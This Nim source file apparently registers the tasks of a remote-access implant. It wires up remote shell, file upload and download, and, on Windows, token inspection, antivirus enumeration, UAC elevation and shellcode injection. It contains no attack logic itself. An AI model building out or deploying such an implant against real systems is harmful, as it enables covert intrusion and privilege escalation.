import ../client/types

import download, shell, upload

# import windows exclusive tasks
when defined(windows):
  import tokinfo, msgbox, processes, antiviruses, uac_elv, inject_shellcode

var tasks*: seq[tuple[
  name: string, 
  execute: proc(app: App, taskId: int, params: seq[string]) {.nimcall.}
]] = @[]

tasks.add((name: "download", execute: download.executeTask))
tasks.add((name: "shell", execute: shell.executeTask))
tasks.add((name: "upload", execute: upload.executeTask))

# load windows exclusive tasks
when defined(windows):
  tasks.add((name: "msgbox", execute: msgbox.executeTask))
  tasks.add((name: "tokinfo", execute: tokinfo.executeTask))
  tasks.add((name: "processes", execute: processes.executeTask))
  tasks.add((name: "antiviruses", execute: antiviruses.executeTask))
  tasks.add((name: "uac_elv", execute: uac_elv.executeTask))
  tasks.add((name: "inject_shellcode", execute: inject_shellcode.executeTask))
